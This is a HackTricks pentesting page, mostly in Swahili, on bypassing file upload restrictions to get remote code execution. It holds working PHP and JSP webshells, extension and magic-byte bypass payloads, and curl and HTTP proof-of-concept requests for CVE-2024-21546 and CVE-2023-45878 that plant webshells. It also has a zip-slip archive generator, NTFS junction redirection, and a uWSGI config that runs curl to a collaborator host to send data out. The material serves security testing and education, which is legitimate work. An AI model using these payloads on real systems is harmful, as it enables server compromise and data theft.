# Kupakia Faili

{{#include ../../banners/hacktricks-training.md}}

## Mbinu za Jumla za Kupakia Faili

Extensions nyingine muhimu:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Kupita ukaguzi wa extensions za faili

1. Ikiwa zinatumika, angalia **extensions zilizotajwa hapo awali.** Pia zijaribu kwa kutumia **herufi kubwa**: _pHp, .pHP5, .PhAr ..._
2. _Jaribu **kuongeza extension halali kabla** ya extension ya utekelezaji (tumia extensions zilizotajwa hapo awali pia):_
- _file.png.php_
- _file.png.Php5_
3. Jaribu kuongeza **alama maalum mwishoni.** Unaweza kutumia Burp kufanya **bruteforce** kwa herufi zote za **ascii** na **Unicode**. (_Kumbuka pia unaweza kujaribu kutumia **extensions** zilizotajwa awali_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Jaribu kupita kinga kwa **kuudanganya parser ya extension** upande wa server kwa mbinu kama **kurudia** ya **extension** au **kuongeza takataka** (bytes **null**) kati ya extensions. _Unaweza pia kutumia **extensions** zilizotajwa awali kuandaa payload bora._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ongeza **tabaka mwingine ya extensions** kwa ukaguzi wa awali:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Jaribu kuweka **extension ya utekelezaji kabla ya extension halali** na matumaini server imekiwa vibaya. (inayofaa kutekeleza misconfigurations ya Apache ambapo chochote chenye extension **.php**, hata kama sio kumaliza na .php, kitatekeleza code):
- _ex: file.php.png_
7. Kutumia **NTFS alternate data stream (ADS)** katika **Windows**. Katika hali hii, herufi ya colon ":" itaingizwa baada ya extension iliyozuiliwa na kabla ya ile inayoruhusiwa. Matokeo yake, faili tupu lenye extension iliyozuiliwa litatengenezwa kwenye server (mfano "file.asax:.jpg”). Faili hii inaweza kuhaririwa baadaye kwa mbinu nyingine kama kutumia short filename yake. Muundo "**::$data**” pia unaweza kutumika kuunda faili zisizo tupu. Kwa hiyo, kuongeza nukta baada ya muundo huu pia inaweza kusaidia kupita vizuizi zaidi (.e.g. "file.asp::$data.”)
8. Jaribu kuvunja vizingiti vya jina la faili. Extension halali inakatwa. Na PHP hatari inabaki. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Baadhi ya upload handlers huondoa au ku-normalize nukta zilizofuata mwishoni za jina la faili zilizohifadhiwa. Katika UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) matoleo kabla ya 2.9.1, unaweza kupita uhakiki wa extension kwa:

- Kutumia MIME ya picha halali na magic header (mfano, PNG’s `\x89PNG\r\n\x1a\n`).
- Kuita faili iliyoupakiwa kwa extension ya PHP ikifuatiwa na nukta, kwa mfano `shell.php.`.
- Server inaondoa nukta iliyofuata na kuhifadhi `shell.php`, ambayo itatekelezwa ikiwa imewekwa katika directory inayotumikia wavuti (hifadhi ya umma ya default kama `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Kisha piga njia iliyohifadhiwa (kawaida katika Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Kupitisha Content-Type, Magic Number, Compression & Resizing

- Kupitisha **Content-Type** checks kwa kuweka **value** ya **Content-Type** **header** kuwa: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Kupitisha **magic number** check kwa kuongeza mwanzoni mwa faili **bytes of a real image** (kuchanganya amri ya _file_). Au ingiza shell ndani ya **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` au unaweza pia **kuingiza payload moja kwa moja** ndani ya picha:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ikiwa **compression** inatafanywa kwenye picha yako, kwa mfano kutumia baadhi ya maktaba za kawaida za PHP kama [PHP-GD](https://www.php.net/manual/fr/book.image.php), mbinu zilizotangulia hazitafaa. Hata hivyo, unaweza kutumia **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Tovuti pia inaweza kuwa inafanya **resizing** ya **image**, kwa kutumia kwa mfano PHP-GD functions `imagecopyresized` au `imagecopyresampled`. Hata hivyo, unaweza kutumia **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Mbinu nyingine ya kutengeneza payload ambayo **inasalia baada ya image resizing**, kwa kutumia PHP-GD function `thumbnailImage`. Hata hivyo, unaweza kutumia **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuweka maandishi ambayo yata **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Mbinu nyingine za kuangalia

- Tafuta udhaifu wa kuweza **rename** faili iliyopakiwa tayari (kubadilisha extension).
- Tafuta udhaifu wa **Local File Inclusion** ili kuendesha backdoor.
- **Possible Information disclosure**:
1. Pakia **mara kadhaa** (na kwa **wakati mmoja**) **faili ile ile** yenye **jina moja**
2. Pakia faili yenye **jina** la **faili** au **folder** ambalo **tayari lipo**
3. Kupakia faili yenye **"." , "..", or "…" kama jina** lake. Kwa mfano, kwenye Apache kwenye **Windows**, ikiwa application inahifadhi faili zilizopakiwa katika directory "/www/uploads/", jina la faili "." litaumba faili iitwayo uploads” katika directory "/www/".
4. Pakia faili ambayo haiwezi kufutwa kwa urahisi kama **"…:.jpg"** kwenye **NTFS**. (Windows)
5. Pakia faili kwenye **Windows** yenye **invalid characters** kama `|<>*?”` katika jina lake. (Windows)
6. Pakia faili kwenye **Windows** ukitumia **reserved** (**forbidden**) **names** kama CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, na LPT9.
- Jaribu pia kupakia **executable** (.exe) au **.html** (inayoonekana kidogo) ambayo **itaendesha code** wakati itakaguliwa kwa bahati mbaya na mwathiriwa.

### Mbinu maalum za extension

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Kwa hivyo, kama ilivyoelezwa kwenye picha ifuatayo, pakia faili ya XML kwenye `$JETTY_BASE/webapps/` na tarajia shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities zinaweza kutumika kwenye servers za uWSGI ikiwa mtu ana uwezo wa kubadilisha faili ya usanidi ya `.ini`. Faili za usanidi za uWSGI zinatumia sintaksia maalum kuingiza "magic" variables, placeholders, na operators. Kwa kuzingatia, operator ya '@', inayotumika kama `@(filename)`, imetengenezwa ili kujumuisha yaliyomo ya faili. Miongoni mwa schemes mbalimbali zinazotumiwa na uWSGI, scheme ya "exec" ni yenye nguvu hasa, ikiruhusu kusoma data kutoka kwenye standard output ya mchakato. Kipengele hiki kinaweza kutumiwa kwa makusudi mabaya kama Remote Command Execution au Arbitrary File Write/Read wakati faili ya usanidi `.ini` inapotumika.

Angalia mfano ufuatao wa faili hatari ya `uwsgi.ini`, unaoonyesha schemes mbalimbali:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Utekelezaji wa payload hufanyika wakati wa kuchambua faili ya configuration. Ili configuration ianze kutekelezwa na ichambuliwe, mchakato wa uWSGI lazima uanzishwe upya (inawezekana baada ya crash au kutokana na Denial of Service attack) au faili iwe imewekwa kwenye auto-reload. Kipengele cha auto-reload, ikiwa kimewezeshwa, hurusha upya faili kwa vipindi vilivyobainishwa wakati kinapotambua mabadiliko.

Ni muhimu kuelewa asili ya wavivu ya uWSGI katika kuchambua faili za configuration. Kwa namna maalum, payload iliyojadiliwa inaweza kuingizwa ndani ya faili ya binary (kama picha au PDF), ikipanua zaidi wigo wa uwezekano wa ku-exploit.

### Gibbon LMS kuandika faili kiholela hadi pre-auth RCE (CVE-2023-45878)

Endpoint isiyo na uthibitisho katika Gibbon LMS inaruhusu kuandika faili kiholela ndani ya web root, na kusababisha pre-auth RCE kwa kupeleka faili ya PHP. Toleo zilizoathirika: hadi na ikiwa ni pamoja na 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Parametri zinazohitajika:
- `img`: data-URI-like string: `[mime];[name],[base64]` (seva huipuuzia type/name, hufanya base64-decode sehemu ya mwisho)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC ndogo ya kuandika na kusoma faili:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Weka webshell ndogo na endesha amri:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Vidokezo:
- The handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
- Resulting code runs as the web service user (e.g., XAMPP Apache on Windows).

Marejeo kwa bug hii ni pamoja na usd HeroLab advisory na entry ya NVD. Angalia sehemu ya References hapa chini.

## **wget File Upload/SSRF Trick**

In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Kumbuka kwamba **chaguo jingine** ambalo unaweza kuwa unafikiria ili kuepuka ukaguzi huu ni kufanya **HTTP server redirect to a different file**, hivyo URL ya awali itaweza kukwepa ukaguzi lakini wget itapakua faili iliyoelekezwa yenye jina jipya. Hii **haitafanyi kazi** **isipokuwa** wget inatumika na **parameter** `--trust-server-names` kwa sababu **wget will download the redirected page with the name of the file indicated in the original URL**.

### Kukwepa upload directory kupitia NTFS junctions (Windows)

(Kwa shambulio hili utahitaji ufikiaji wa ndani kwenye mashine ya Windows) Wakati uploads zinapohifadhiwa chini ya subfolders kwa kila mtumiaji kwenye Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) na ukidhibiti uundaji/ufutaji wa subfolder hiyo, unaweza kuiweka badala yake directory junction inayolekeza kwenye eneo nyeti (e.g., the webroot). Uploads zinazofuata zitaandikwa kwenye target path, zikiruhusu utekelezaji wa server‑side code ikiwa lengo litatafsiri server‑side code.

Mfano wa mtiririko wa redirect uploads ndani ya XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Vidokezo
- mklink /J inaunda NTFS directory junction (reparse point). Akaunti ya seva ya wavuti lazima ifuate junction na kuwa na ruhusa ya kuandika kwenye mahali pa mwisho.
- Hii inaelekeza kuandika faili kwa njia yoyote; ikiwa mahali pa mwisho unatekeleza scripti (PHP/ASP), hili linageuka kuwa RCE.
- Ulinzi: usiruhusu writable upload roots ziwe attacker‑controllable chini ya C:\Windows\Tasks au sawa; zuia uundaji wa junction; thibitisha extensions upande wa server; hifadhi uploads kwenye volume tofauti au kwa deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Baadhi ya upload/ingest handlers huandika raw request body hadi filesystem path inayojengwa kutoka kwa user-controlled query parameters. Ikiwa handler pia inaunga mkono Content-Encoding: gzip na inashindwa kukamilisha/kuthibitisha destination path, unaweza kuunganisha directory traversal na a gzipped payload ili kuandika arbitrary bytes kwenye web-served directory na kupata RCE (kwa mfano, kuangusha JSP chini ya Tomcat’s webapps).

Generic exploitation flow:
- Tayarisha server-side payload yako (e.g., minimal JSP webshell) na gzip-compress the bytes.
- Tuma POST ambapo path parameter (e.g., token) ina traversal inayokiuka folda iliyokusudiwa, na file inaonyesha jina la faili linalotakiwa kuhifadhi. Weka Content-Type: application/octet-stream na Content-Encoding: gzip; body ni the compressed payload.
- Tembelea faili iliyoorodheshwa ili kusababisha utekelezaji.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Kisha trigger:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Vidokezo
- Path za lengo zinatofautiana kulingana na usakinishaji (kwa mfano, /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ katika stacks fulani). Folda yoyote inayoweza kupatikana kupitia wavuti ambayo inaendesha JSP itafanya kazi.
- Burp Suite’s Hackvertor extension inaweza kutoa gzip body sahihi kutoka kwa payload yako.
- Hii ni pattern safi ya pre-auth arbitrary file write → RCE; haiwezi kutegemea multipart parsing.

Kupunguza hatari
- Bainisha mahali pa upload upande wa server; usiamini kamwe vipande vya path vinavyotoka kwa clients.
- Canonicalize na ulazimishe kwamba path iliyotatuliwa inabaki ndani ya allow-listed base directory.
- Hifadhi uploads kwenye non-executable volume na ukatae script execution kutoka kwa writable paths.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ni chombo chenye nguvu kilichotengenezwa kusaidia Pentesters na Bug Hunters katika kujaribu file upload mechanisms. Kinatumia mbinu mbalimbali za bug bounty kurahisisha mchakato wa kubaini na kushambuliwa kwa vulnerabilities, kuhakikisha tathmini kamili za web applications.

### Corrupting upload indices with snprintf quirks (historical)

Baadhi ya legacy upload handlers zinazotumia `snprintf()` au vitu vinavyofanana kujenga multi-file arrays kutoka single-file upload zinaweza kuchezewa ili kusababisha uundaji wa muundo wa `_FILES`. Kutokana na utofautiano na kukatwa kwa tabo katika tabia ya `snprintf()`, single upload iliyotengenezwa kwa ustadi inaweza kuonekana kama multiple indexed files upande wa server, ikachanganya logic inayodhani muundo thabiti (mfano, kuitambulisha kama multi-file upload na kuchukua unsafe branches). Ingawa ni niche leo, pattern hii ya “index corruption” mara kwa mara inajitokeza tena kwenye CTFs na codebases za zamani.

## From File upload to other vulnerabilities

- Weka **filename** kuwa `../../../tmp/lol.png` na jaribu kufanikisha **path traversal**
- Weka **filename** kuwa `sleep(10)-- -.jpg` na unaweza kufanikiwa kupata **SQL injection**
- Weka **filename** kuwa `<svg onload=alert(document.domain)>` ili kupata **XSS**
- Weka **filename** kuwa `; sleep 10;` ili kujaribu command injection (mapendekezo zaidi ya [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Jaribu **different svg payloads** kutoka [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ikiwa unaweza elekeza web server ichukue image kutoka kwa URL unaweza jaribu kuabusu [SSRF](../ssrf-server-side-request-forgery/index.html). Ikiwa image hii itahifadhiwa kwenye tovuti ya umma, unaweza pia kuelekeza URL kutoka [https://iplogger.org/invisible/](https://iplogger.org/invisible/) na ukaiba taarifa za kila mtembeleaji.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF zilizotengenezwa maalum kwa XSS: Ukurasa ufuatao unaonyesha jinsi ya **inject PDF data to obtain JS execution** (../xss-cross-site-scripting/pdf-injection.md). Ikiwa unaweza upload PDFs unaweza kuandaa PDF itakayotekeleza arbitrary JS kwa kuzingatia maelekezo yaliyotolewa.
- Tuma yaliyomo ya \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) ili kuangalia kama server ina **antivirus**
- Angalia ikiwa kuna **size limit** unapoupload files

Hapa kuna orodha ya top 10 ya vitu unavyoweza kufanikisha kwa kupakia (kutoka [hapa](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Rejea [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) kwa filetypes nyingine.

## Zip/Tar File Automatically decompressed Upload

Ikiwa unaweza upload ZIP ambayo itafinyangwa ndani ya server, unaweza kufanya mambo 2:

### Symlink

Upload link iliyo na soft links kuelekea files nyingine, kisha, ukiingiza files zilizofinyangwa utapata files zilizo linked:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Tolea muundo katika folda tofauti

Uundaji usiotarajiwa wa files katika directories wakati wa decompression ni tatizo kubwa. Licha ya mawazo ya awali kwamba usanidi huu unaweza kuzuia OS-level command execution kupitia malicious file uploads, hierarchical compression support na directory traversal capabilities za muundo wa ZIP zinaweza kutumika vibaya. Hii inawawezesha attackers kupita restrictions na kutoroka kutoka secure upload directories kwa ku-manipulate decompression functionality ya targeted application.

Exploit iliyotengenezwa kiotomatiki ili kutengeneza mafaili kama hayo inapatikana kwenye [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Zana inaweza kutumika kama ifuatavyo:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Vilevile, chaguo la **symlink trick with evilarc** lipo. Ikiwa lengo ni kulenga faili kama `/flag.txt`, symlink kwa faili hiyo inapaswa kuundwa kwenye mfumo wako. Hii inahakikisha kwamba evilarc haitapata makosa wakati wa operesheni yake.

Hapa chini kuna mfano wa Python code inayotumika kuunda zip file hatari:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Kwa maelezo zaidi **angalia chapisho la asili kwenye**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Msimbo wa PHP umeandikwa kutekeleza amri zinazopitishwa kupitia `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Mafaili mengi yameundwa na archive ya zip imekusanywa ikijumuisha mafaili haya.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Majina ya mafaili ndani ya zip yamebadilishwa kwa kutumia vi au hex editor, kubadilisha "xxA" kuwa "../" ili kuvuka directories.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Wakati backend inathibitisha ZIP entries kwa kutumia PHP’s ZipArchive lakini extraction inaandika kwenye filesystem ikitumia raw names, unaweza kusafisha extension isiyoruhusiwa kwa kuingiza NUL (0x00) katika field za filename. ZipArchive inachukulia entry name kama C‑string na inakata katika NUL ya kwanza; filesystem inaandika jina kamili, ikiacha kila kitu baada ya NUL.

High-level flow:
- Tayarisha legitimate container file (mfano, valid PDF) ambayo ina embed tiny PHP stub katika stream ili magic/MIME ibaki PDF.
- Iiite kama `shell.php..pdf`, zip it, kisha hex‑edit the ZIP local header and central directory filename ili kubadilisha dot ya kwanza baada ya `.php` na `0x00`, ikitoa `shell.php\x00.pdf`.
- Validators zinazotegemea ZipArchive zitaona `shell.php .pdf` na kuiruhusu; extractor inaandika `shell.php` kwenye disk, ikisababisha RCE ikiwa upload folder ni executable.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Vidokezo
- Badilisha matukio yote mawili ya jina la faili (local na central directory). Baadhi ya zana huongeza pia data descriptor entry – rekebisha all name fields ikiwa zipo.
